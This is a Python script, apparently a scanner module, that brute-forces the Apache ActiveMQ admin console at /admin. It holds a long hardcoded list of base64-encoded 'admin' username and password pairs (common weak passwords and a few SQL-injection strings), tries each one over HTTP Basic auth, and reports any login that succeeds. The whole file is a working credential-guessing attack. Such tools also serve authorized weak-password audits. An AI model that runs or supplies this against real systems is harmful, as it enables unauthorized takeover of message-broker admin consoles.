# -*- coding: utf-8 -*-
import requests
import base64

'''
Usage:
    moon.py -u  activemq  http://xx.xx.xx.xx:xxxx
     http://xx.xx.xx.xx:8161/admin/    弱口令   admin  admin
'''

def attack(URL):
    print('[+]开始检测-ActiveMQ弱口令。[+]')
    url = URL +'/admin'
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    passwords = ['YWRtaW46IUAjJCVeJio=', 'YWRtaW46IUAjJCVeJg==', 'YWRtaW46IUAjJCVe', 'YWRtaW46IUAjJCU=', 'YWRtaW46IUAjJA==', 'YWRtaW46QCMkJV4m', 'YWRtaW46MA==', 'YWRtaW46MDAwMDAw', 'YWRtaW46MDAwMDAwYQ==', 'YWRtaW46MTAwMjAw', 'YWRtaW46MTAxMDEw', 'YWRtaW46MTEwMTEw', 'YWRtaW46MTEwMTIw', 'YWRtaW46MTEwMTIwMTE5', 'YWRtaW46MTExMTE=', 'YWRtaW46MTExMTEx', 'YWRtaW46MTExMTExMQ==', 'YWRtaW46MTExMTExMTE=', 'YWRtaW46MTExMTExMTEx', 'YWRtaW46MTExMTExMTExMQ==', 'YWRtaW46MTExMTExYQ==', 'YWRtaW46MTExMjIy', 'YWRtaW46MTEyMjMz', 'YWRtaW46MTEyMjMzNDQ=', 'YWRtaW46MTEyMzU4MTMyMQ==', 'YWRtaW46MTIxMjEy', 'YWRtaW46MTIxMjEyMTI=', 'YWRtaW46MTIz', 'YWRtaW46MTIzMDAw', 'YWRtaW46MTIzMTIz', 'YWRtaW46MTIzMTIzMTIz', 'YWRtaW46MTIzMTIzYQ==', 'YWRtaW46MTIzMzIx', 'YWRtaW46MTIzNA==', 'YWRtaW46MTIzNDQzMjE=', 'YWRtaW46MTIzNDU=', 'YWRtaW46MTIzNDU1NDMyMQ==', 'YWRtaW46MTIzNDU2Li4=', 'YWRtaW46MTIzNDU2', 'YWRtaW46MTIzNDU2Nw==', 'YWRtaW46MTIzNDU2Nzg=', 'YWRtaW46MTIzNDU2Nzg5Li4=', 'YWRtaW46MTIzNDU2Nzg5', 'YWRtaW46MTIzNDU2Nzg5MA==', 'YWRtaW46MTIzNDU2Nzg5MDA=', 'YWRtaW46MTIzNDU2Nzg5MQ==', 'YWRtaW46MTIzNDU2Nzg5MTA=', 'YWRtaW46MTIzNDU2Nzg5OQ==', 'YWRtaW46MTIzNDU2Nzg5YQ==', 'YWRtaW46MTIzNDU2Nzg5YWJj', 'YWRtaW46MTIzNDU2Nzg5cQ==', 'YWRtaW46MTIzNDU2Nzg5cXE=', 'YWRtaW46MTIzNDU2YQ==', 'YWRtaW46MTIzNDU2YWE=', 'YWRtaW46MTIzNDU2YUFA', 'YWRtaW46MTIzNDU2YWJj', 'YWRtaW46MTIzNDU2YXNk', 'YWRtaW46MTIzNDU2cQ==', 'YWRtaW46MTIzNDU2cXE=', 'YWRtaW46MTIzNDVh', 'YWRtaW46MTIzNHF3ZXI=', 'YWRtaW46MTIzNjU0', 'YWRtaW46MTIzNjU0Nzg5', 'YWRtaW46MTIzNjk4NzQ1', 'YWRtaW46MTIzYWJj', 'YWRtaW46MTIzcXdl', 'YWRtaW46MTIzcXdlYXNk', 'YWRtaW46MTIzJHF3ZVI=', 'YWRtaW46MTJxd2Fzeng=', 'YWRtaW46MTMxMzEz', 'YWRtaW46MTMxNDUyMA==', 'YWRtaW46MTMxNDUyMDUyMA==', 'YWRtaW46MTMxNDUyMQ==', 'YWRtaW46MTM1NzkyNDY4', 'YWRtaW46MTM1NzkyNDY4MA==', 'YWRtaW46MTQ3MjU4', 'YWRtaW46MTQ3MjU4MzY5', 'YWRtaW46MTQ3MjU4MzY5MA==', 'YWRtaW46MTU5MzU3', 'YWRtaW46MTU5NzUz', 'YWRtaW46MTYzLmNvbQ==', 'YWRtaW46MTY4MTY4', 'YWRtaW46MUEyQjNDNEQ=', 'YWRtaW46MWcydzNlNHI=', 'YWRtaW46MSBvciAxPTE=', 'YWRtaW46MScgb3IgJzEnPScx', 'YWRtaW46MSIgb3IgIjEiPSIx', 'YWRtaW46MScgb3JkZXIgYnkgMS0t', 'YWRtaW46MScgb3JkZXIgYnkgMTAtLQ==', 'YWRtaW46MXAybzNp', 'YWRtaW46MXEydzNl', 'YWRtaW46MXEydzNlNHI=', 'YWRtaW46MXEydzNlNHI1dA==', 'YWRtaW46MXFhejJ3c3g=', 'YWRtaW46MXFheiFRQVo=', 'YWRtaW46MXFhekBXU1g=', 'YWRtaW46MXFhenhzdzI=', 'YWRtaW46MjIyMjIy', 'YWRtaW46MjIyMjIyMg==', 'YWRtaW46MjIyMjIyMjI=', 'YWRtaW46MzE0MTU5MjY=', 'YWRtaW46MzMzMzMz', 'YWRtaW46M2VkYyRSRlY=', 'YWRtaW46NDU2ODUy', 'YWRtaW46NTIwMTMxNA==', 'YWRtaW46NTIwMTMxNDUyMA==', 'YWRtaW46NTIwMTMxNGE=', 'YWRtaW46NTIwNTIw', 'YWRtaW46NTIxMTMxNA==', 'YWRtaW46NTIxNTIx', 'YWRtaW46NTU1NTU1', 'YWRtaW46NTU1NTU1NTU=', 'YWRtaW46NTg0MTMxNDUyMA==', 'YWRtaW46NTg0NTIw', 'YWRtaW46NTg0NTIwMTMxNA==', 'YWRtaW46NjU0MzIx', 'YWRtaW46NjY2NjY2', 'YWRtaW46NjY2ODg4', 'YWRtaW46NzQxODUyOTYz', 'YWRtaW46NzUzOTUx', 'YWRtaW46Nzc1ODI1OA==', 'YWRtaW46Nzc1ODUyMQ==', 'YWRtaW46Nzc3Nzc3', 'YWRtaW46Nzc3Nzc3Nw==', 'YWRtaW46Nzc3Nzc3Nzc=', 'YWRtaW46Nzg5NDU2', 'YWRtaW46Nzg5NDU2MTIz', 'YWRtaW46Nzg5NDU2MTIzMA==', 'YWRtaW46NzkwMTE5', 'YWRtaW46ODA0ODY=', 'YWRtaW46ODg4ODg4', 'YWRtaW46ODg4ODg4ODg=', 'YWRtaW46ODg4OTk5', 'YWRtaW46OTYwNjI4', 'YWRtaW46OTg3NjU0', 'YWRtaW46OTg3NjU0MzIx', 'YWRtaW46OTg3NjU0MzIxMA==', 'YWRtaW46OTk5OTk5', 'YWRtaW46OTk5OTk5OTk=', 'YWRtaW46OTk5OTk5OTk5', 'YWRtaW46YTAwMDAwMA==', 'YWRtaW46YTExMTExMQ==', 'YWRtaW46YTEyMzEyMw==', 'YWRtaW46YTEyMzMyMQ==', 'YWRtaW46YTEyMzQ1', 'YWRtaW46YTEyM180NTY=', 'YWRtaW46YTEyMzQ1Ng==', 'YWRtaW46YTEyMzQ1Njc4', 'YWRtaW46YTEyMzQ1Njc4OQ==', 'YWRtaW46YTFiMmMz', 'YWRtaW46YTUyMDEzMTQ=', 'YWRtaW46QWFAMTIzNDU=', 'YWRtaW46QWFAMTIzNDU2', 'YWRtaW46QWExMjM0NTYh', 'YWRtaW46QWExMjM0NTYu', 'YWRtaW46QWExMjM0NTY=', 'YWRtaW46QWExMjM0NTY3IQ==', 'YWRtaW46YWExMjM0NTY3ODk=', 'YWRtaW46YWFhMTEx', 'YWRtaW46YWFhMTIz', 'YWRtaW46YWFhMTIzNDU2', 'YWRtaW46YWFhYWFh', 'YWRtaW46YWJjMTIz', 'YWRtaW46YWJjMTIzNDU2', 'YWRtaW46YWJjMTIzNDU2Nzg5', 'YWRtaW46YWJjYWJj', 'YWRtaW46YWJjZDEyMw==', 'YWRtaW46YWJjZDEyMzQ=', 'YWRtaW46YWJjZDEyMzQ1Ng==', 'YWRtaW46YWJjZGVm', 'YWRtaW46YWRtaW4=', 'YWRtaW46YWRtaW44ODg=', 'YWRtaW46YWRtaW5pc3RyYXRvcg==', 'YWRtaW46YWluaTEzMTQ=', 'YWRtaW46YXB0eDQ4Njk=', 'YWRtaW46YXMxMjM0NTY=', 'YWRtaW46YXNkMTIz', 'YWRtaW46YXNkMTIzNDU2', 'YWRtaW46YXNkYXNk', 'YWRtaW46YXNkYXNkMTIz', 'YWRtaW46YXNkZg==', 'YWRtaW46YXNkZmdo', 'YWRtaW46YXNkZmdoamts', 'YWRtaW46YmFuZ29uZ3NoaQ==', 'YWRtaW46Y2FvbmltYQ==', 'YWRtaW46Y2FvbmltYTEyMw==', 'YWRtaW46Y29tcHV0ZXI=', 'YWRtaW46Zm9vdGJhbGw=', 'YWRtaW46ZnVja3lvdQ==', 'YWRtaW46ZnVja3lvdTE=', 'YWRtaW46Z3dlcnR5', 'YWRtaW46Z3dlcnR5MTIz', 'YWRtaW46aGVsbG8xMjM0', 'YWRtaW46aWxvdmV5b3U=', 'YWRtaW46aWxvdmV5b3Ux', 'YWRtaW46bG92ZQ==', 'YWRtaW46bG92ZTEyMw==', 'YWRtaW46bG92ZTEzMTQ=', 'YWRtaW46bXlzcGFjZTE=', 'YWRtaW46bmloYW8xMjM=', 'YWRtaW46bnVsbA==', 'YWRtaW46cGFzc3dk', 'YWRtaW46cGFzc3dvcmQ=', 'YWRtaW46cGFzc3dvcmQx', 'YWRtaW46UGFzc3dvcmQy', 'YWRtaW46UG1zQDEyMzQ=', 'YWRtaW46cHJpbmNlc3M=', 'YWRtaW46cHJpbmNlc3Mx', 'YWRtaW46UEBzc3cwcmQ=', 'YWRtaW46cEBzc3dvcmQ=', 'YWRtaW46cTEyMzQ1Ng==', 'YWRtaW46cTEyMzQ1Njc4OQ==', 'YWRtaW46cTF3MmUz', 'YWRtaW46cTF3MmUzcjQ=', 'YWRtaW46cTF3MkUjUiQ=', 'YWRtaW46UUFaMTIz', 'YWRtaW46cWF6MTIzNDU2', 'YWRtaW46IVFBWjJ3c3g=', 'YWRtaW46cWF6d3N4', 'YWRtaW46cWF6d3N4MTIz', 'YWRtaW46cWF6d3N4ZWRj', 'YWRtaW46IVFBWnhzdzI=', 'YWRtaW46cWF6eHN3MjE=', 'YWRtaW46cXExMjMxMjM=', 'YWRtaW46cXExMjM0NTY=', 'YWRtaW46cXExMjM0NTY3ODk=', 'YWRtaW46cXExMzE0NTIw', 'YWRtaW46cXE1MjAxMzE0', 'YWRtaW46cXdlMTIz', 'YWRtaW46cXdlMTIzNDU2', 'YWRtaW46cXdlYXNk', 'YWRtaW46cXdlcjEyMzQ=', 'YWRtaW46cXdlcnR5', 'YWRtaW46cXdlcnR5MQ==', 'YWRtaW46UXdlcnR5MTI=', 'YWRtaW46cXdlcnR5MTIz', 'YWRtaW46UXdlcnR5MTIzNDU=', 'YWRtaW46cXdlcnR5dWlvcA==', 'YWRtaW46cm9vdA==', 'YWRtaW46cm9vdEBXSlM=', 'YWRtaW46czEyMzQ1Ng==', 'YWRtaW46c3Vuc2hpbmU=', 'YWRtaW46dGFyZ2V0MTIz', 'YWRtaW46dGVzdA==', 'YWRtaW46dGVzdDEyMw==', 'YWRtaW46dGVzdGo=', 'YWRtaW46VXNAMTIzNDU=', 'YWRtaW46dXNlcm5hbWU=', 'YWRtaW46VXNyMTIzNDU=', 'YWRtaW46dzEyMzQ1Ng==', 'YWRtaW46dzEyMzQ1Njc4OQ==', 'YWRtaW46d2FuZzEyMw==', 'YWRtaW46d2FuZzEyMzQ1Ng==', 'YWRtaW46d29haW5p', 'YWRtaW46d29haW5pMTIz', 'YWRtaW46d29haW5pMTMxNA==', 'YWRtaW46d29haW5pMTMxNDUyMA==', 'YWRtaW46d29haW5pNTIw', 'YWRtaW46d29haW5pNTIx', 'YWRtaW46QFdTWGNkZTM=', 'YWRtaW46V3dfMTIzNDU2', 'YWRtaW46d3d3MTIzNDU2', 'YWRtaW46ejEyMzQ1Ng==', 'YWRtaW46ejEyMzQ1Njc4OQ==', 'YWRtaW46emFxMTJ3c3g=', 'YWRtaW46WkFRITJ3c3g=', 'YWRtaW46emhhbmcxMjM=', 'YWRtaW46enhjMTIz', 'YWRtaW46enhjMTIzNDU2', 'YWRtaW46enhjdmJubQ==', 'YWRtaW46enhjdmJubTEyMw==', 'YWRtaW46VGVzdDEyMyQ=', 'YWRtaW46MXEydzNlNHI1dA==']
    try:
        requests.get(url, headers=headers)
        verify_response = requests.get(url, headers=headers)
        if verify_response.status_code == 401:
            print('[*]存在web管理界面，开始爆破：'+url)
            for passwd in passwords:
                try:
                    headers={"User-Agent":user_agent,"Authorization":'Basic '+passwd}
                    verify_response = requests.get(url, headers=headers)
                    if verify_response.status_code == 200:
                        print('发现弱口令：'+str(base64.b64decode(passwd), "utf-8"))
                        break
                except Exception:
                    pass
        else:
            print('未发现管理页面：'+url)
    except Exception:
        print("检测错误，未发现漏洞。")
    print('[+]检测结束-ActiveMQ弱口令。[+]')
    print('\n')


if __name__ == "__main__":
    attack()
